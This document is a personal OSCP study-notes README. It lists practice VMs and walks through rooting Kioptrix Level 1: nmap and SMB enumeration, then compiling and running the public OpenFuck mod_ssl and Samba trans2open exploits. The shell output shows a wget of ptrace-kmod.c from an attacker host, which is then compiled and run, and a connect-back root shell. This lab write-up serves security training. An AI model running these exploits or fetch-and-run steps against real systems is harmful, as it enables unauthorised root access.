# Oscp study

Notes of my Offensive Security Certified Professional (OSCP) study plan. :-)

## OSCP-like VMs:
- Beginner friendly:
	- Kioptrix: Level 1 (#1) **[done!]**
	- Kioptrix: Level 1.1 (#2) 
	- Kioptrix: Level 1.2 (#3) 
	- Kioptrix: Level 1.3 (#4) 
	- FristiLeaks: 1.3 
	- Stapler: 1
	- PwnLab: init
- Intermediate:
	- Kioptrix: 2014
	- Brainpan: 1 (Part 1 of BO is relevant to OSCP. egghunting is out of scope though)
	- Mr-Robot: 1  
	- HackLAB: Vulnix
 	- Not so sure (Didn't solve them yet):
	- VulnOS: 2
	- SickOs: 1.2
	- /dev/random: scream 
	- pWnOS: 2.0
	- SkyTower: 1 
	- IMF
- Windows 
	- Metasploitable 3
	- /dev/random: Sleepy (Uses VulnInjector, need to provide you own ISO and key.)
	- Bobby: 1 (Uses VulnInjector, need to provide you own ISO and key.)

(credits for **@abatchy**)

## Links:

https://www.securitysift.com/offsec-pwb-oscp/
http://hackingandsecurity.blogspot.com.br/2016/04/oscp-related-notes.html

## Kioptrix: Level 1

Basic enumeration:

```bash
ferreirasc@roarrr:/$ nmap -sV -sC -sS -p- 192.168.3.96
Starting Nmap 7.40 ( https://nmap.org ) at 2017-04-23 10:12 -03
Nmap scan report for 192.168.3.96
Host is up (0.058s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey:
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1           1024/tcp  status
|_  100024  1           1024/udp  status
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/http    Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
|_ssl-date: 2017-04-23T01:00:04+00:00; -12h12m39s from scanner time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|_    SSL2_RC4_64_WITH_MD5
1024/tcp open  status      1 (RPC #100024)

Host script results:
|_clock-skew: mean: -12h12m39s, deviation: 0s, median: -12h12m39s
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.80 seconds
```

#### Exploit 1: Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Exploit

- Exploit: [exploit-db link](https://www.exploit-db.com/exploits/764/)
- Updated: xpl/openfuck.c (thx for [@paulsec](http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/))

```bash
ferreirasc@roarrr:/$ gcc openfuck.c -L/usr/local/opt/openssl/lib -I/usr/local/opt/openssl/include -lcrypto -o openfuck
ferreirasc@roarrr:/$ ./openfuck 0x6b 192.168.3.96 -c 20
*******************************************************************
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 20 of 20
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f8050
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$
 p ptrace-kmod.c; rm ptrace-kmod.c; ./p; 192.168.3.60:8081/ptrace-kmod.c; gcc -o
--21:29:54--  http://192.168.3.60:8081/ptrace-kmod.c
           => `ptrace-kmod.c'
Connecting to 192.168.3.60:8081...
Connection to 192.168.3.60:8081 refused.
gcc: ptrace-kmod.c: No such file or directory
gcc: No input files
rm: cannot remove `ptrace-kmod.c': No such file or directory
ls
p
payload
payload.py
session_mm.sem
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
bash -i
[root@kioptrix tmp]#
```
#### Exploit 2: Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow

- Exploit: [exploit-db link](https://www.exploit-db.com/exploits/22470/)
- xpl/trans2open.c

SMB enumeration:

```bash
root@kali:~# enum4linux -a 192.168.3.96
<............ omitted information .........>
 ======================================
|    OS information on 192.168.3.96    |
 ======================================
[+] Got OS info for 192.168.3.96 from smbclient: Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
[+] Got OS info for 192.168.3.96 from srvinfo:
	KIOPTRIX       Wk Sv PrQ Unx NT SNT Samba Server
	platform_id     :	500
	os version      :	4.5
	server type     :	0x9a03
<............ omitted information .........>
```

Server was running Samba 2.2.1a, vulnerable to trans2open rce exploit. So...

```bash
ferreirasc@roarrr:~$ searchsploit samba 2.2.
----------------------------------------------------------------------------------------------------------- --------------------------------------------------------------------
 Exploit Title                                                                                             |  Path
                                                                                                           | (/usr/local/Cellar/exploitdb/2016-12-24/share/exploitdb/platforms)
----------------------------------------------------------------------------------------------------------- --------------------------------------------------------------------
(Linux Kernel 2.6) Samba 2.2.8 (Debian / Mandrake) - Share Privilege Escalation                            | /linux/local/23674.txt
Samba 2.2.x - Buffer Overflow                                                                              | /linux/remote/7.pl
Samba 2.2.8 - Remote Code Execution                                                                        | /linux/remote/10.c
Samba 2.2.8 - (Brute Force Method) Remote Command Execution                                                | /linux/remote/55.c
Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                               | /osx/remote/9924.rb
Samba 2.2.x - nttrans Overflow (Metasploit)                                                                | /linux/remote/9936.rb
Samba 2.2.2 < 2.2.6 - nttrans Buffer Overflow (Metasploit)                                                 | /linux/remote/16321.rb
Samba 2.2.8 (Solaris SPARC) - 'trans2open' Overflow (Metasploit)                                           | /solaris_sparc/remote/16330.rb
Samba 2.2.8 (Linux x86) - 'trans2open' Overflow (Metasploit)                                               | /linux/remote/16861.rb
Samba 2.2.8 (OSX/PPC) - 'trans2open' Overflow (Metasploit)                                                 | /osx_ppc/remote/16876.rb
Samba 2.2.8 (*BSD x86) - 'trans2open' Overflow Exploit (Metasploit)                                        | /linux/remote/16880.rb
Samba SMB 2.2.x - CIFS/9000 Server A.01.x Packet Assembling Buffer Overflow                                | /unix/remote/22356.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (1)                                                 | /unix/remote/22468.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (2)                                                 | /unix/remote/22469.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (3)                                                 | /unix/remote/22470.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (4)                                                 | /unix/remote/22471.txt
----------------------------------------------------------------------------------------------------------- --------------------------------------------------------------------
ferreirasc@roarrr:~$ gcc /usr/local/Cellar/exploitdb/2016-12-24/share/exploitdb/platforms/unix/remote/22470.c -o transopen
ferreirasc@roarrr:~$ ./transopen 0 192.168.3.96 192.168.3.60
[+] Listen on port: 45295
[+] Connecting back to: [192.168.3.60:45295]
[+] Target: Linux
[+] Connected to [192.168.3.96:139]
[+] Please wait in seconds...!
[+] Yeah, I have a root ....!
------------------------------
Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
uid=0(root) gid=0(root) groups=99(nobody)
```